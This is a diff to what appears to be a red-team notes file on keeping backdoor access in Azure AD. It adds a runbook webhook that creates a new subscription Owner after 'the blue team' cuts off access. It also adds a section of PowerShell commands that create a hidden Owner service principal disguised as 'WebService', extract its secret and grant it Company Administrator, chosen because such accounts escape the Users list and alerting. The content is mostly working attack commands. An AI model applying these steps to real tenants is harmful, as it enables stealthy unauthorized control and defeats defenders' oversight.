@@ -11,7 +11,7 @@
 - This provides (at minimum) read access to the directory
 - Hybrid deployments may sync from Azure > On-Prem
 
-## Runbooks
+## Runbook backdoor with webhook
 - Create a new Automation account with “Create Azure Run As Account” enabled
 - Navigate to Azure Active Directory > Roles and Administrators> User administrator
 - Click Add Assignments • Search for your new automation account and add it
@@ -51,3 +51,49 @@ New-AzRoleAssignment -SignInName $user -RoleDefinitionName Owner
 - Now if the blue team catches you and cuts off your access you have a backdoor.
 - All you have to do now is open a PowerShell terminal and run this to create a brand new Azure account that is owner of the subscription
 - ```Invoke-WebRequest -Method Post -Uri <Webhook URL>```
+
+## Service principal global admin
+- This can be a bit less noticeable as service principal accounts do not show up in the Azure Active Directory “Users” list
+-  Blue team should be alerting on new additions to global admins
+- Instead of adding to “Company Administrator” just add it to “User Account Administrator” group.
+
+#### Create a new service principal
+- Note the “ApplicationId”. This is the service principal’s “username” for auth
+```
+$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
+$spn
+```
+
+#### Get service principal's secret
+- this is the password
+```
+$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
+$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+$UnsecureSecret
+```
+
+#### Get the service principal using the application id
+```
+sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
+```
+
+#### Set the role
+```
+$role = Get-MsolRole -RoleName "Company Administrator"
+```
+
+#### Add the service principal as a role member
+```
+Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
+```
+
+#### Check the role members
+```
+Get-MsolRoleMember -RoleObjectId $role.ObjectId
+```
+
+#### Authenticate as service principal
+```
+$cred = Get-Credential
+Connect-AzAccount -Credential $cred -Tenant <Tenant ID> -ServicePrincipal
+```
